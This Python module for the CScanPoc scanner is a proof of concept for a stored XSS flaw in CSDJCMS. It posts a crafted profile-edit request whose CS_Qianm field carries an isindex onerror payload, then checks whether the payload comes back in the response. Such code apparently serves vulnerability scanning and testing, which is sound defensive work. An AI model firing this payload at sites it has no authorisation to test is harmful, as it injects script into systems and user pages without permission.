# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import urllib.parse


class Vuln(ABVuln):
    vuln_id = 'CSDJCMS_0003'  # 平台漏洞编号
    name = 'CSDJCMS(程氏舞曲管理系统) 储存型XSS'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.XSS  # 漏洞类型
    disclosure_date = '2013-11-11'  # 漏洞公布时间
    desc = '''
        CSDJCMS(程氏舞曲管理系统) /user/do.php?ac=edit@op=zl。
    '''  # 漏洞描述
    ref = 'http://0day5.com/archives/894/'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'CSDJCMS(程氏舞曲管理系统)'  # 漏洞应用名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '316cadca-b0db-45c8-a2a4-5424eb088cdc'
    author = '47bwy'  # POC编写者
    create_date = '2018-06-14'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            # https://bugs.shuimugan.com/bug/view?bug_no=42552
            payload = '/user/do.php?ac=edit@op=zl'
            url = self.target + payload
            hh = hackhttp.hackhttp()
            raw = """
Accept: text/html, application/×html+xml, applicalion/xml; q=0.9, */*; q=0.8
Accept-Language: zh-cn, zh; q=0.5 
Accept-Encoding: gzip, deflate
Accept-Charset : GB2312, utf-8; q=0.7, * ; q=0.7 
Keep-Alive: 115 
Connection: keep-alive 
Referer: {url} 
Cookie: PHPSESSID=8bo9g3shahcqj12fkp0dq79q61; cs_id=2; cs_name=aaaaaa
X-forwarded-For: www.baidu.com 
Content-Type: application/x-www-form-urlencoded 
Content-Length: 5605

CS_Name=aaaaaa&CS_Email=a%40qq.com&CS_Nichen=aaaaaa&CS_Sex=0&CS_City=%C1%C9%C4%FE%CA%A1&CS_QQ=111111111&CS_Qianm=<isindex type=image src=1 onerror=alert(/'xss'/)>""".format(url=url)
            code, head, res, errcode, _ = hh.http(url, raw=raw)

            if "/'xss'/" in res and '确定' in res:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
